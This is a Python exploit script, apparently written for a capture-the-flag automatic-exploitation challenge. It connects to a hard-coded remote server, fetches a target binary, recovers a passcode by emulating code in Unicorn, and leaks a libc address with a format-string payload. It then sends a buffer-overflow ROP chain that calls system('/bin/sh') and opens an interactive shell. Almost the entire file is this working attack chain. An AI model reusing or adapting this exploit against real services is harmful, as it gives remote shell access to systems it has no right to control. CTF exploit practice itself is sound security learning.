from unicorn import *
from unicorn.x86_const import *
from pwn import *
from gzip import decompress

import os
import angr
import logging
import shutil

logging.getLogger().setLevel(logging.WARNING)


BASE_ADDR = 0x400000
STACK_TOP = 0x7fff0000
STACK_BOTTOM = 0x7ffff000
CALL_FUNC = [0x4015c8, 0x401608, 0x4013eb, 0x401648, 0x401465, 0x4015a9, 0x401516, 0x4014bb, 0x401553, 0x4013cb, 0x4014d9, 0x401428]

LAST_FUNC_ADDR = 0
def nop_patch(mu, addr):
    for i in range(5):
        mu.mem_write(addr + i, b'\x90')

def my_invalid_mem_hook(mu: Uc, access, address: int, *_):
    print("--- invalid:")
    print(hex(address))
    print("--- regs:")
    print(f"RAX: {mu.reg_read(UC_X86_REG_RAX):016x}")
    print(f"RBX: {mu.reg_read(UC_X86_REG_RBX):016x}")
    print(f"RCX: {mu.reg_read(UC_X86_REG_RCX):016x}")
    print(f"RDX: {mu.reg_read(UC_X86_REG_RDX):016x}")
    print(f"RDI: {mu.reg_read(UC_X86_REG_RDI):016x}")
    print(f"RSI: {mu.reg_read(UC_X86_REG_RSI):016x}")
    print(f"R8 : {mu.reg_read(UC_X86_REG_R8):016x}")
    print(f"R9 : {mu.reg_read(UC_X86_REG_R9):016x}")
    print(f"R10: {mu.reg_read(UC_X86_REG_R10):016x}")
    print(f"R11: {mu.reg_read(UC_X86_REG_R11):016x}")
    print(f"R12: {mu.reg_read(UC_X86_REG_R12):016x}")
    print(f"R13: {mu.reg_read(UC_X86_REG_R13):016x}")
    print(f"R14: {mu.reg_read(UC_X86_REG_R14):016x}")
    print(f"R15: {mu.reg_read(UC_X86_REG_R15):016x}")
    print(f"RSP: {mu.reg_read(UC_X86_REG_RSP):016x}")
    print(f"RBP: {mu.reg_read(UC_X86_REG_RBP):016x}")
    print(f"RIP: {mu.reg_read(UC_X86_REG_RIP):016x}")
    print(f"EFLAGS: {mu.reg_read(UC_X86_REG_EFLAGS):016x}")
    
def my_code_hook(uc, address, size, user_data):
    if address == BASE_ADDR + 0x172f:
        uc.reg_write(UC_X86_REG_RAX, user_data['passcode'])

def hook_mem_invalid(uc, access, address, size, value, user_data):
    if access == UC_MEM_WRITE_UNMAPPED:
        print(">>> Missing memory is being WRITE at 0x%x, data size = %u, data value = 0x%x" %(address, size, value))
        return True
    else:
        print(">>> Missing memory is being READ at 0x%x, data size = %u, data value = 0x%x" %(address, size, value))
        return False

def hook_mem_access(uc, access, address, size, value, user_data):
    if access == UC_MEM_WRITE:
        print(">>> Memory is being WRITE at 0x%x, data size = %u, data value = 0x%x" %(address, size, value))
    else:   # READ
        print(">>> Memory is being READ at 0x%x, data size = %u" %(address, size))


def fetch_BOF(proj, addr):
    COUNT = 0
    CALL_COUNT = 0
    BOF_SIZE = 0

    # while True:
    block = proj.factory.block(addr)
    opcode = block.bytes

    if b'\xe8' in opcode: # CALL
        for insn in block.capstone.insns:
            if insn.mnemonic == "call":
                # CALL_FUNC_ADDRESS.append(insn.address)
                CALL_ARG = int(insn.op_str[:-1], 16) 
                
                print("[+] CALLEE: ", hex(CALL_ARG))
                DUMP = b""

                if not os.path.isfile(f"./result/{args.binary}_{hex(CALL_ARG)}"):
                    with open(f"./result/{args.binary}_{hex(CALL_ARG)}", "wb") as f:
                        while True:
                            inner_block = proj.factory.block(CALL_ARG)
                            inner_opcode = inner_block.bytes

                            if b'\x48\x81' in inner_opcode:
                                for insn in inner_block.capstone.insns:
                                    # print(insn)
                                    # print(insn.op_str)
                                    if insn.mnemonic == "sub": # and not COUNT:
                                        buf_size = insn.op_str.split(',')[1][:-1]
                                        buf_size = int(buf_size, 16)
                                        BOF_SIZE += buf_size

                                    # elif insn.mnemonic == "sub" and COUNT:
                                    #     buf_size = insn.op_str.split(',')[1][:-1]
                                    #     buf_size = int(buf_size, 16)

                                    #     print(f"[+] BOF - Instruction is {insn}")
                                    #     print(f"[+] BOF - Buffer size is {buf_size} ({hex(buf_size)})")
                                    #     BOF_SIZE = buf_size

                            # if b'\xe8' in inner_opcode: # call
                            #     for insn in inner_block.capstone.insns:
                            #         if insn.mnemonic == "mov" and insn.op_str.split(',')[0] == 'edx' and not CALL_COUNT:
                            #             CALL_COUNT += 1
                            #         elif insn.mnemonic == "mov" and insn.op_str.split(',')[0] == 'edx' and CALL_COUNT:
                            #             read_arg = insn.op_str.split(',')[1][:-1]
                            #             read_arg = int(read_arg, 16)
                            #             print(f"[+] BOF - Read size {read_arg} ({hex(read_arg)})")
                                        

                            if b'\xc9\xc3' in inner_opcode: # leave; ret
                                DUMP += inner_opcode

                                print("[+] NOW DUMP IS")
                                print(hexdump(DUMP))
                                
                                f.write(DUMP)
                                break

                            DUMP += inner_opcode
                            CALL_ARG = inner_block.addr + inner_block.size

        # BOF_SIZE = read_arg - buf_size
        return BOF_SIZE

def main(args):

    if args.t: 
        START_NEEDLE=b"-----BEGIN SPERMAEG BINARY-----\n"
        END_NEEDLE=b"-----END SPERMAEG BINARY-----\n"

        p = remote("172.233.81.34", 11111)
        p.readuntil(START_NEEDLE)
        recv_data = p.readuntil(END_NEEDLE)[:-len(END_NEEDLE)]


        with open(args.binary, 'wb') as f:
            sample_compressed = b64d(recv_data)
            f.write(decompress(sample_compressed))
        
        os.chmod(args.binary,0o777)

    context.log_level = 'debug'

    # p = process(args.binary)
    e = ELF(args.binary)
    libc = e.libc

    r = ROP(libc)

    p.recvuntil(b"passcode is ")

    pwnpasscode = int(p.recvuntil(b"\n")[:-1], 16)
    print("[+] Binary Passcode is", hex(pwnpasscode))

    proj = angr.Project(args.binary, auto_load_libs=False)
    state = proj.factory.entry_state()
    simgr = proj.factory.simgr(state)

    sub_171e = BASE_ADDR+0x171E
    CURRENT_ADDR = sub_171e
    ALL_DUMP = b""

    while True:
        block = proj.factory.block(CURRENT_ADDR)
        opcode = block.bytes
        ALL_DUMP += opcode

        if b'\xe8' in opcode: # CALL
            for insn in block.capstone.insns:
                if insn.mnemonic == "call":
                    # CALL_FUNC_ADDRESS.append(insn.address)
                    # print(insn.op_str)
                    CALL_ARG = int(insn.op_str[:-1], 16) 
                    
                    if CALL_ARG not in CALL_FUNC: break

                    # print("CALL: ", hex(CALL_ARG))
                    DUMP = b""

                    if not os.path.isfile(f"./result/{args.binary}_{hex(CALL_ARG)}"):
                        with open(f"./result/{args.binary}_{hex(CALL_ARG)}", "wb") as f:
                            while True:
                                inner_block = proj.factory.block(CALL_ARG)
                                inner_opcode = inner_block.bytes

                                if b'\x5d\xc3' in inner_opcode: #pop rbp; ret
                                    DUMP += inner_opcode

                                    # print("[+] NOW DUMP IS")
                                    # print(hexdump(DUMP))
                                    f.write(DUMP)
                                    break

                                DUMP += inner_opcode
                                CALL_ARG = inner_block.addr + inner_block.size

                    DUMP = b""
        
        if b'\xc9\xc3' in opcode:  # '\xc9' is the opcode for the 'leave' instruction
            LAST_FUNC_ADDR = CURRENT_ADDR
            # print(f'Found "leave" instruction at block starting at address {hex(CURRENT_ADDR)}')
            break

        CURRENT_ADDR = block.addr + block.size
    
    with open(f"./result/{args.binary}_{hex(sub_171e)}", "wb") as f:
        f.write(ALL_DUMP)
        # print(hexdump(ALL_DUMP))

    # input("CREATE SAMPLE DUMP FILE FINISH\n> ")

    # unicorn
    mu = Uc(UC_ARCH_X86, UC_MODE_64)
    mu.mem_map(STACK_TOP, STACK_BOTTOM - STACK_TOP) # stack은 아래에서 위로
    mu.mem_map(BASE_ADDR, 0x10000)

    # print(f"[+] {STACK_TOP:8x} ~ {STACK_TOP + STACK_BOTTOM - STACK_TOP:8x}")
    # print(f"[+] {BASE_ADDR:8x} ~ {BASE_ADDR +0x10000:8x}")

    for file in os.listdir("./result/"):
        with open(f"./result/{file}", 'rb') as f:
            data = f.read()
            # print(hexdump(data))
            addr = int(file.split("_")[1], 16)
            # print(hex(addr))
            mu.mem_write(addr, data)


    BOF_CALLER_FUNC = BASE_ADDR + 0x1396
    FSB_CALLER_FUNC = BASE_ADDR + 0x13A2
    
    BOF_SZ = fetch_BOF(proj, BOF_CALLER_FUNC)
    print("[*] BOF SZ: ", BOF_SZ, hex(BOF_SZ))

    # with open("./sample1", "rb") as f:
    #     data = f.read()
    #     mu.mem_write(BASE_ADDR, data)

    mu.reg_write(UC_X86_REG_RIP, BASE_ADDR + 0x171e)
    mu.reg_write(UC_X86_REG_RSP, STACK_BOTTOM - 0x1000)
    mu.reg_write(UC_X86_REG_RBP, STACK_BOTTOM - 0x900)

    
    # print(mu.mem_read(BASE_ADDR + 0x172f, 5))
    # print(mu.mem_read(BASE_ADDR + 0x174d, 5))

    # nop patch
    nop_patch(mu, BASE_ADDR + 0x172f)
    nop_patch(mu, BASE_ADDR + 0x174d)
    
    # print(mu.mem_read(BASE_ADDR + 0x172e, 5))
    # print(mu.mem_read(BASE_ADDR + 0x174d, 5))


    # print("MEMORY WRITE END\n> ")

    mu.hook_add(UC_HOOK_CODE, my_code_hook, {'passcode': pwnpasscode}, BASE_ADDR + 0x172f, BASE_ADDR + 0x1734)
    mu.hook_add(UC_HOOK_MEM_INVALID, my_invalid_mem_hook)
    # mu.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED, hook_mem_invalid)
    # mu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)
    # mu.hook_add(UC_HOOK_MEM_READ, hook_mem_access)
    
    mu.emu_start(begin=(BASE_ADDR + 0x171e), until=(LAST_FUNC_ADDR))

    Rpasscode = mu.reg_read(UC_X86_REG_AX)
    print("[+] PASSCODE IS : ", end="")
    print(hex(Rpasscode))

    print(hexdump(mu.reg_read(UC_X86_REG_AX)))
    p.recvuntil(b"passcode: ")
    p.send(p16(Rpasscode))

    # p.recvuntil(b"> ")
    # p.send(p32(2))

    p.sendafter(b"> ", p32(2)) 

    #get fsb buffer size
    p.recvuntil(b"FSB: ")
    # p.send(b"AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
    # fsb_pay = b"AAAAAAAA.%73$p.%74$p.%75$p.%76$p.%77$p.%78$p.%79$p.%80$p"
    # fsb_pay = b"AAAAAAAA.%p.%p.%75$p.%76$p.%77$p.%78$p.%79$p.%80$p"
    
    # 0x100000064.0x200001000.0x5dc65dc6.0x1.0x7fd841ea4d90.
    # b'0x7fc6bc2e7d90.(nil).0x55e5cf2c3249.0x19f7c42d0.0x7ffc9f7c42e8'
    # b'0x7f9e6b67ed90.(nil).0x5557efb25249.0x1c3b931d0.0x7ffcc3b931e8'
    # fsb_pay = b"%15$p.%16$p.%17$p.%18$p.%19$p"

    fsb_pay = b"%15$p"
    print(f"[+] fsb payload: {fsb_pay}, len: {len(fsb_pay)}")
    assert(len(fsb_pay) <= 32)
    p.send(fsb_pay)


    fmt_str_bugs = p.recvuntil(b'>')[:-1]

    print("[+] Answer is ", fmt_str_bugs)
    fmt_str_bugs = int(fmt_str_bugs.decode(),16)
    print(f"[-] Libc Base? : {fmt_str_bugs - 0x29d90}, {fmt_str_bugs - 0x29d90:8x}")
    
    libc_base = fmt_str_bugs - 0x29d90
    system_addr = libc_base + libc.symbols.system
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    pop_rdi = libc_base + (r.find_gadget(["pop rdi", "ret"]))[0]

    print(f"[+] System Address: {system_addr:8x}")
    print(f"[+] /bin/sh Address: {binsh_addr:8x}")
    print(f"[+] rop gadget: {pop_rdi:8x}")
    
    # p.recvuntil(b"> ")
    p.send(p32(1)) 
    # p.interactive
    # p.sendafter(b"> ", p32(1))


    pay = b"D" * BOF_SZ
    pay += b"S" * 8
    pay += p64(pop_rdi)
    pay += p64(binsh_addr)
    pay += p64(system_addr)

    print(f"[+] Payload Length: {len(pay):x}")
    print(hexdump(pay))

    p.recvuntil(b"BOF: ")
    p.send(pay)

    p.interactive()


if __name__ == "__main__":
    from argparse import ArgumentParser
    
    dir_path = './result'
    if os.path.exists(dir_path): shutil.rmtree(dir_path)
    if not os.path.exists(dir_path): os.makedirs(dir_path)
    
    parser = ArgumentParser()
    parser.add_argument("binary", type=str)
    parser.add_argument("-t", type=int)
    # parser.add_argument("passcode", type=(lambda x: int(x, 16)))
    args = parser.parse_args()
    main(args)